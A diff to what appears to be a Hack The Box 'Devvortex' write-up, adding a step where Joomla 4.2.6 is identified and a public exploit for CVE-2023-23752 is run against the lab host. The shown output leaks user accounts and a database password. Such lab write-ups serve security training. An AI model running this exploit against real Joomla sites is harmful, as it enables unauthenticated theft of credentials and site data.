@@ -65,4 +65,35 @@ Disallow: /tmp/
 ```
 
 http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
-we found this is a 4.2.6 Joomla
+we found this is a 4.2.6 Joomla \
+
+this version is vulnerable to an unauthenticated information disclosure \
+Sources : \
+https://www.exploit-db.com/exploits/51334\
+https://github.com/Acceis/exploit-CVE-2023-23752\
+
+with the script that can access to api, we can get the current informations \
+
+```
+──(parallels㉿kali)-[~/hacking/htb/Devvortex]
+└─$ ./51334.py http://dev.devvortex.htb 
+Users
+[649] lewis (lewis) - lewis@devvortex.htb - Super Users
+[650] logan paul (logan) - logan@devvortex.htb - Registered
+
+Site info
+Site name: Development
+Editor: tinymce
+Captcha: 0
+Access: 1
+Debug status: false
+
+Database info
+DB type: mysqli
+DB host: localhost
+DB user: lewis
+DB password: P4ntherg0t1n5r3c0n##
+DB name: joomla
+DB prefix: sd4fg_
+DB encryption 0
+```
